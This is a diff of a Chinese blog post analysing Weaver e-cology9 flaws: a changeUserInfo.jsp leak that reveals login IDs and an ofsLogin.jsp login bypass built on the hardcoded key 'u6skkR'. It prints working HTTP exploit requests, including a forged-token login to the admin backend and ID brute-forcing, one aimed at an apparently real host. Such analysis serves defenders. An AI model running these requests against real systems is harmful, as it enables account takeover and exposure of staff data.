@@ -8,7 +8,7 @@ updated: 2023-05-20T00:00:00+00:00
 date: 2023-05-18T00:00:00+00:00
 slug: weaver-ecology9-changeuserinfo-ofslogin
 title: 泛微e-cology9 changeUserInfo信息泄漏及ofsLogin任意用户登录漏洞
-cover: https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/76fbbe33-dd17-487e-9fc2-82cd3ce0001c/image-20230520151651201.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050157Z&X-Amz-Expires=3600&X-Amz-Signature=a283ea8bf0e34ae53190ba7ae10baeb46c26a36862df26565c94e0d178fd815c&X-Amz-SignedHeaders=host&x-id=GetObject
+cover: /img/post/weaver-ecology9-changeuserinfo-ofslogin/image-20230520151651201.png
 id: 111906e1-7468-801e-a874-de4999d8216b
 ---
 
@@ -45,21 +45,20 @@ id: 111906e1-7468-801e-a874-de4999d8216b
 
 2023 年 04 月 18 日，泛微首次发布 v10.57 版本补丁包，同年 05 月 15 日又发布 v10.57.2 版本补丁包，通过如下两条链接分别下载两个版本的补丁包。
 
-```text
-<https://www.weaver.com.cn/cs/package/Ecology_security_20230418_v9.0_v10.57.zip?v=20230418>
+```
+https://www.weaver.com.cn/cs/package/Ecology_security_20230418_v9.0_v10.57.zip?v=20230418
 ```
 
-```text
-<https://www.weaver.com.cn/cs/package/Ecology_security_20230515_v9.0_v10.57.2.zip?v=20230515>
 ```
+https://www.weaver.com.cn/cs/package/Ecology_security_20230515_v9.0_v10.57.2.zip?v=20230515
 
 由于泛微官方已经将本文两个漏洞的补丁文件覆盖到了 v10.57 版本补丁包中，所以现在下载到的 v10.57 版本补丁包其中也有了相关的漏洞补丁文件。拿现在构造好的链接下载得到的 v10.57 版本补丁包与 v10.57.2 版本补丁包相对比是对比不出什么差异的。
 
 不过我在 04 月 20 日及时下载了 v10.57 版本的补丁包，所以拿其与现在的 v10.57.2 版本补丁包对比，是能够很迅速地发现新增的漏洞补丁文件。
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/5dc62d76-14f2-4a54-9a2b-253ffb556825/image-20230519162317147.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=a13c621c3bf117dfea12ca3f4720bf0723d426d7d20789b5eda55b6453ede1f2&X-Amz-SignedHeaders=host&x-id=GetObject)
+![](/img/post/weaver-ecology9-changeuserinfo-ofslogin/image-20230519162317147.png)
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/a925ebbd-0fe6-4f15-a787-c366c1f451ed/image-20230519162750163.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=71ccdf8519e74f5f9e00c34a2f45fa2002b7c676c18681a7a5deafd993a70266&X-Amz-SignedHeaders=host&x-id=GetObject)
+![](/img/post/weaver-ecology9-changeuserinfo-ofslogin/image-20230519162750163.png)
 
 如下是第一个漏洞补丁代码，暴露出的是`/mobile/plugin/1/ofsLogin.jsp`文件与`syscode`参数，并且还检查`transferE9`文件中`secretkey`的值是否等于`u6skkR`，如果是则提醒更改密钥，且产生漏洞利用安全警告。
 
@@ -117,7 +116,7 @@ if (path.contains("/mobile/") && path.contains("/plugin/") && path.contains("/ch
 
 首先先进入`mobile/plugin/1/ofsLogin.jsp`文件，如下图所示。
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/0062489a-7f28-405c-ac2d-8c201c7edd78/image-20230519164856242.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=80a0ae0a4c32fb87a974e912e0b4d554c77f68b3c3caf85d193e2454708211d4&X-Amz-SignedHeaders=host&x-id=GetObject)
+![](/img/post/weaver-ecology9-changeuserinfo-ofslogin/image-20230519164856242.png)
 
 最开头根据`syscode`、`receiver`、`timestamp`、`loginTokenFromThird`、`gopage`参数接收相应的参数值，然后对`loginTokenFromThird`参数值进行判断是否等于`loginTokenFromThird2`的值，如果不等于则会登录失败跳转至`/login/Login.jsp`。
 
@@ -191,13 +190,13 @@ loginTokenFromThird2 = AESCoder.encrypt(receiver+timestamp, syscode+"u6skkR");
 
 继续看`AESCoder.encrypt`方法，一种基于 AES 算法的加密方法。
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/63b1e5ac-24cb-4339-ac14-37aa988e107e/image-20230519171839628.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=36f7aa03eee91b2a25f8df28b5623f548e6bbe5dc6f6ea7b47d4e7278fa57418&X-Amz-SignedHeaders=host&x-id=GetObject)
+![](/img/post/weaver-ecology9-changeuserinfo-ofslogin/image-20230519171839628.png)
 
 那么当`loginTokenFromThird`参数值等于`loginTokenFromThird2`的值即`AESCoder.encrypt(receiver+timestamp, syscode+"u6skkR")`时，则继续往下进入到 else 分支。
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/cbcc260e-c5fc-46be-86e8-54942ec6c4c5/image-20230519175427532.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=d6bd259dd05423cc6af8a80bf50e94209757d5acde3d435e1b8cd0acf1901b01&X-Amz-SignedHeaders=host&x-id=GetObject)
+![](/img/post/weaver-ecology9-changeuserinfo-ofslogin/image-20230519175427532.png)
 
-首先是根据`syscode`参数值进行的一句 SQL 查询，根据`syscode`的值从`ofs_sendinfo`表中查询`hrmtransrule`的值。如果从表中查询到的`hrmtransrule`的值为空，则赋值字符串`"1"`为`hrmtransrule`参数的值。接着根据`hrmtransrule`参数值的不同，对`rule`参数赋不同的值，当然如果`hrmtransrule`参数值不等于`"0"`/`"1"`/`"2"`/`"3"`/`"4"`其中一个，它就默认等于`"loginid"`。
+首先是根据`syscode`参数值进行的一句SQL查询，根据`syscode`的值从`ofs_sendinfo`表中查询`hrmtransrule`的值。如果从表中查询到的`hrmtransrule`的值为空，则赋值字符串`"1"`为`hrmtransrule`参数的值。接着根据`hrmtransrule`参数值的不同，对`rule`参数赋不同的值，当然如果`hrmtransrule`参数值不等于`"0"`/`"1"`/`"2"`/`"3"`/`"4"`其中一个，它就默认等于`"loginid"`。
 
 ```java
 rs.executeQuery("select hrmtransrule from ofs_sendinfo where syscode = ?",syscode);
@@ -232,7 +231,7 @@ id	syscode	serverurl	classimpl	isvalid	sysdesc	hrmtransrule	send_type_setting
 1	IM	weaver.ofs.interfaces.SendRequestStatusDataImplForIM	1	For IM	NULL	NULL
 ```
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/71f9cedd-ed88-40b8-8d5d-9c0a3968e8f8/image-20230519224717665.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=44bab7534fbe8d690079904f1c51abd8c448b5488668e4f0583b4bb81ddd7a33&X-Amz-SignedHeaders=host&x-id=GetObject)
+![](/img/post/weaver-ecology9-changeuserinfo-ofslogin/image-20230519224717665.png)
 
 之后，根据`rule`参数值等于`"loginid"`，又进行了一次 SQL 查询，这次是从`HrmResource`表中进行查询。此处的`?`表示一个占位符号，在这里意味着`receiver`变量的值。
 
@@ -275,13 +274,13 @@ select * from HrmResource;
 id	loginid	password	lastname	sex	birthday	nationality	systemlanguage	maritalstatus	telephone	mobile	mobilecall	email	locationid	workroom	homeaddress	resourcetype	startdate	enddate	jobtitle	jobactivitydesc	joblevel	seclevel	departmentid	subcompanyid1	costcenterid	managerid	assistantid	bankid1	accountid1	resourceimageid	createrid	createdate	lastmodid	lastmoddate	lastlogindate	datefield1	datefield2	datefield3	datefield4	datefield5	numberfield1	numberfield2	numberfield3	numberfield4	numberfield5	textfield1	textfield2	textfield3	textfield4	textfield5	tinyintfield1	tinyintfield2	tinyintfield3	tinyintfield4	tinyintfield5	certificatenum	nativeplace	educationlevel	bememberdate	bepartydate	workcode	regresidentplace	healthinfo	residentplace	policy	degree	height	usekind	jobcall	accumfundaccount	birthplace	folk	residentphone	residentpostcode	extphone	managerstr	status	fax	islabouunion	weight	tempresidentnumber	probationenddate	countryid	passwdchgdate	needusb	serial	account	lloginid	needdynapass	dsporder	passwordstate	accounttype	belongto	dactylogram	assistantdactylogram	passwordlock	sumpasswordwrong	oldpassword1	oldpassword2	msgStyle	messagerurl	pinyinlastname	tokenkey	userUsbType	outkey	adsjgs	adgs	adbm	mobileshowtype	usbstate	totalSpace	occupySpace	ecology_pinyin_search	isADAccount	accountname	notallot	beforefrozen	resourcefrom	isnewuser	haschangepwd	created	creater	modified	modifier	passwordlocktime	mobilecaflag	salt	companystartdate	workstartdate	secondaryPwd	useSecondaryPwd	classification	uuid	passwordLockReason	companyworkyear	workyear	DISMISSDATE	encKey	crc
 ```
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/4202d928-fd11-4b48-9eef-c71b6263df62/image-20230519231925736.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=9270045bc9fd684af56e98aa774a064d9dc54a7620ecaacf1368c55a7a5d4e49&X-Amz-SignedHeaders=host&x-id=GetObject)
+![](/img/post/weaver-ecology9-changeuserinfo-ofslogin/image-20230519231925736.png)
 
 登入系统后台新建一名人员，再看`HrmResource`表发生的变化。
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/2ead6eb1-7ed2-45d9-ba6b-91a0e25f40b4/image-202305201752562374.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=2dfdcefca32837c3f19f3cb850398d6e2c1b40ffc22fde194e57cb1011fb2974&X-Amz-SignedHeaders=host&x-id=GetObject)
+![](/img/post/weaver-ecology9-changeuserinfo-ofslogin/image-202305201752562374.png)
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/1cf427c3-443b-4700-b7c2-b959c6bf96a5/image-20230523110130299.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=cc013d9756161d19a4dfcc4ebec72b6f2ab8a6651f268509f775f3d4bba3ae9b&X-Amz-SignedHeaders=host&x-id=GetObject)
+![](/img/post/weaver-ecology9-changeuserinfo-ofslogin/image-20230523110130299.png)
 
 如上图，其中`status`字段代表的是人员的状态，有试用/正式/临时三种状态，显然`1`对应的是正式状态，只要满足这个值小于 4 即可。
 
@@ -329,7 +328,7 @@ if ("getLoginid".equalsIgnoreCase(type)){
 
 查询时使用了`%`，可以模糊匹配`mobile`，当查询出的结果条数为 0 时，返回`{"status":"-1"}`。
 
-```text
+```http
 GET /mobile/plugin/changeUserInfo.jsp?type=getLoginid&mobile=1234 HTTP/1.1
 Host:
 User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
@@ -339,7 +338,7 @@ Connection: close
 
 ```
 
-```text
+```http
 HTTP/1.1 200 OK
 Server: WVS
 Cache-Control: private
@@ -359,7 +358,7 @@ Date: Fri, 19 May 2023 01:41:30 GMT
 
 当大于 1 时返回`{"status":"0"}` ，如下。
 
-```text
+```http
 GET /mobile/plugin/changeUserInfo.jsp?type=getLoginid&mobile=1 HTTP/1.1
 Host:
 Accept-Encoding: gzip, deflate
@@ -372,7 +371,7 @@ Cache-Control: max-age=0
 
 ```
 
-```text
+```http
 HTTP/1.1 200 OK
 Server: WVS
 Cache-Control: private
@@ -392,13 +391,13 @@ Date: Fri, 19 May 2023 01:42:50 GMT
 
 在这种情况下，是可以利用 BurpSuite 的 Intruder 做进一步模糊查询移动电话的。如下第二张图，存在一个包含 17 的移动电话，以及多个包含 18 的移动电话。
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/f8677a4a-4a80-4a1b-a542-6b1fd16f5c83/image-20230520113512246.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=183b3c8c60201b1d241368c676b57e83375cee15b127d73fcf42bde0a3c9fe27&X-Amz-SignedHeaders=host&x-id=GetObject)
+![](/img/post/weaver-ecology9-changeuserinfo-ofslogin/image-20230520113512246.png)
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/be602e7d-6a39-4cd0-be11-834f05bf2827/image-20230520113701520.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=a988f046c6b214b054cd81405ee6aa4c0ddf31683e414a589b5589ddba7b20c6&X-Amz-SignedHeaders=host&x-id=GetObject)
+<img src="/img/post/weaver-ecology9-changeuserinfo-ofslogin/image-20230520113701520.png" alt="image-20230520113701520" style="zoom: 50%;" />
 
 当等于 1 时返回`{"status":"1"}` 以及`loginId`及其值，在这种情况下，我们就可以直接获取一个`loginId`。
 
-```text
+```http
 GET /mobile/plugin/changeUserInfo.jsp?type=getLoginid&mobile=1 HTTP/1.1
 Host:
 User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
@@ -408,7 +407,7 @@ Connection: close
 
 ```
 
-```text
+```http
 HTTP/1.1 200 OK
 Server: nginx
 Date: Fri, 19 May 2023 01:43:50 GMT
@@ -530,7 +529,7 @@ public JSONObject getPassChangedReminder(String var1) {
 
 那么根据这个差异便可以用来爆破`loginId`，如下图。
 
-```text
+```http
 GET /mobile/plugin/changeUserInfo.jsp?type=status&loginId=user HTTP/1.1
 Host: weoa.sundan.com
 User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
@@ -540,7 +539,7 @@ Connection: close
 
 ```
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/d2b6d156-cf30-46d4-a709-0b7a05f37cd0/image-20230520143947132.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=a48ec5f251c70cc4d1ac02d7b27864982be0fa31578e8513a49207fe213cd0ed&X-Amz-SignedHeaders=host&x-id=GetObject)
+![](/img/post/weaver-ecology9-changeuserinfo-ofslogin/image-20230520143947132.png)
 
 当`type`等于`getUserid`时，代码如下。
 
@@ -584,7 +583,7 @@ public int getUserId(String var1) {
 
 根据此差异，此处同样可以被用来爆破`loginId`。
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/b16778f5-490b-4403-9c8d-099033148f53/image-20230520145322146.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=26091d0bb7b739f0df0247f13932b5b2a55a1fbdc8a7940e8c41fd88099cd825&X-Amz-SignedHeaders=host&x-id=GetObject)
+![](/img/post/weaver-ecology9-changeuserinfo-ofslogin/image-20230520145322146.png)
 
 在新建人员信息时，相比于移动电话，登录名的存在更为必需，也就是说在数据库表存在数据的情况下，每条数据它的`mobile`字段可能为空，但是`loginid`字段为空的概率更小。不过第一种利用模糊查询`mobile`的信息泄漏利用手法，比后两种爆破`loginId`更好利用，因为仅仅涉及到数字。
 
@@ -594,11 +593,11 @@ public int getUserId(String var1) {
 
 在已知一个`loginId`值为`"user1"`的情况下，首先通过加密算法生成`loginTokenFromThird`的值。
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/155a7525-11f4-4598-a9ea-ddc72a51dfb1/image-20230520151651201.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=98952333c6917336937fd7dd861cbc44b8b53517f451733d3f31119e6717f677&X-Amz-SignedHeaders=host&x-id=GetObject)
+![](/img/post/weaver-ecology9-changeuserinfo-ofslogin/image-20230520151651201.png)
 
 然后作如下请求，便能成功进入系统后台`/wui/index.html`页面。
 
-```text
+```http
 GET /mobile/plugin/1/ofsLogin.jsp?syscode=1&timestamp=1&gopage=/wui/index.html&receiver=user1&loginTokenFromThird=793527b3f4855296c85629a7271e20e7 HTTP/1.1
 Host:
 User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
@@ -608,10 +607,10 @@ Connection: close
 
 ```
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/e0cd6c88-a175-489d-a0b9-bc76acac84be/image-20230520151811489.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=b2fe1674940921be1ba23e9fd36701bc80b0b348f87b3242272612d906e9cc02&X-Amz-SignedHeaders=host&x-id=GetObject)
+![](/img/post/weaver-ecology9-changeuserinfo-ofslogin/image-20230520151811489.png)
 
 ## 修复建议
 
 目前厂商已发布了升级补丁以修复这个安全问题，请到厂商的补丁主页下载最新版本补丁包：
 
-- [https://www.weaver.com.cn/cs/securityDownload.html?src=cn](https://www.weaver.com.cn/cs/securityDownload.html?src=cn)
+- https://www.weaver.com.cn/cs/securityDownload.html?src=cn
